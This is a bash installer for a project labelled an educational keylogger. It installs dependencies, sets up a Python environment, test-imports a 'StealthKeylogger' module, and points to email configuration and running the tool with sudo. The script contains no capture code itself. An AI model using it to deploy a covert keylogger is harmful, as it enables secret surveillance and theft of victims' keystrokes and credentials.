#!/bin/bash
# Educational Keylogger Setup Script
# Version 2.1 - Enhanced Edition

echo "🔒 Educational Keylogger v2.1 - Setup Script"
echo "============================================="
echo ""
echo "⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY ⚠️"
echo ""

# Check if running as root for system dependencies
if [[ $EUID -eq 0 ]]; then
   echo "🚫 Don't run this setup script as root!"
   echo "💡 Run as regular user - we'll ask for sudo when needed"
   exit 1
fi

# Check Python version
echo "🐍 Checking Python version..."
python3 --version
if [ $? -ne 0 ]; then
    echo "❌ Python 3 not found. Please install Python 3.8+"
    exit 1
fi

# Install system dependencies
echo ""
echo "📦 Installing system dependencies..."
sudo apt-get update
sudo apt-get install -y python3-dev python3-pip python3-venv xdotool wmctrl xprop

# Create virtual environment
echo ""
echo "🔧 Setting up virtual environment..."
python3 -m venv .venv
source .venv/bin/activate

# Upgrade pip
echo "⬆️  Upgrading pip..."
pip install --upgrade pip

# Install Python dependencies
echo ""
echo "📚 Installing Python dependencies..."
pip install -r requirements.txt

# Create logs directory
echo ""
echo "📁 Creating logs directory..."
mkdir -p logs

# Set proper permissions
echo "🔒 Setting permissions..."
chmod 755 logs
chmod 600 config/config.json

# Test installation
echo ""
echo "🧪 Testing installation..."
python -c "
try:
    from src.managers.config_manager import ConfigManager
    from src.managers.log_manager import LogManager
    from src.core.keylogger import StealthKeylogger
    print('✅ All core modules imported successfully')
except ImportError as e:
    print(f'❌ Import error: {e}')
    exit(1)
"

echo ""
echo "🎉 Setup completed successfully!"
echo ""
echo "📋 Next steps:"
echo "   1. Activate virtual environment: source .venv/bin/activate"
echo "   2. Configure email settings in config/config.json (optional)"
echo "   3. Run: sudo python main.py"
echo ""
echo "📖 Documentation: documentation/INDEX.md"
echo "📧 Email setup: documentation/EMAIL_SETUP.md"
echo ""
echo "⚖️  Remember: Only use on systems you own or have permission to test!"